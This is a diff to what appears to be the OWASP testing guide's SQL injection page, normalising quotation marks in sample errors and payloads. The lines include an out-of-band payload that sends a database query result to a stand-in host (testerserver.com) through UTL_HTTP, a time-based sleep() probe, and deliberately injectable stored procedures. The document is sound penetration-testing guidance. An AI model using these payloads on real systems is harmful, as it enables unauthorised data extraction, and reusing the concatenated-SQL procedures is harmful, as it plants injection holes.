@@ -198,7 +198,7 @@ Oracle:
 MS SQL Server:
 
 ```html
-Microsoft SQL Native Client error ‘80040e14’
+Microsoft SQL Native Client error '80040e14'
 Unclosed quotation mark after the character string
 
 SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
@@ -208,7 +208,7 @@ PostgreSQL:
 
 ```html
 Query failed: ERROR: syntax error at or near
-"’" at character 56 in /www/site/test.php on line 121.
+"'" at character 56 in /www/site/test.php on line 121.
 ```
 
 If there is no error message or a custom error message, the tester can try to inject it into string fields using varying concatenation techniques:
@@ -489,7 +489,7 @@ Automation:
 
 #### Boolean Exploitation Technique
 
-The Boolean exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything about the structure of the query or the database, or return any SQL error - it may just return a HTTP 404 or 500, or a browser redirect.
+The Boolean exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything about the structure of the query or the database, or return any SQL error - it may just return an HTTP 404 or 500, or a browser redirect.
 
 By using inference methods, it is possible to avoid this obstacle and thus succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers, and finally deducing the meaning of such answers. We consider, as always, the `www.example.com` domain and we suppose that it contains a parameter named `id` vulnerable to SQL injection. This means that when carrying out the following request:
 
@@ -575,7 +575,7 @@ Consider also the request to a script that executes the query above:
 
 The malicious request would be:
 
-`https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`
+`https://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80'||(SELECT user FROM DUAL)--`
 
 In this example, the tester is concatenating the value 10 with the result of the function `UTL_HTTP.request`. This Oracle function will try to connect to `testerserver` and make an HTTP GET request containing the return from the query `SELECT user FROM DUAL`. The tester can set up a web server (e.g. Apache) or use the Netcat tool:
 
@@ -601,7 +601,7 @@ Consider also the request to a script that executes the query above:
 
 The malicious request would be (e.g. MySql 5.x):
 
-`https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`
+`https://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false'))--`
 
 In this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.
 
@@ -615,9 +615,9 @@ Consider the following SQL Server Stored Procedure:
 Create procedure user_login @username varchar(20), @passwd varchar(20)
 As
 Declare @sqlstring varchar(250)
-Set @sqlstring  = ‘
+Set @sqlstring  = '
 Select 1 from users
-Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
+Where username = ' + @username + ' and passwd = ' + @passwd
 exec(@sqlstring)
 Go
 ```
@@ -640,8 +640,8 @@ Create
 procedure get_report @columnamelist varchar(7900)
 As
 Declare @sqlstring varchar(8000)
-Set @sqlstring  = ‘
-Select ‘ + @columnamelist + ‘ from ReportTable‘
+Set @sqlstring  = '
+Select ' + @columnamelist + ' from ReportTable'
 exec(@sqlstring)
 Go
 ```
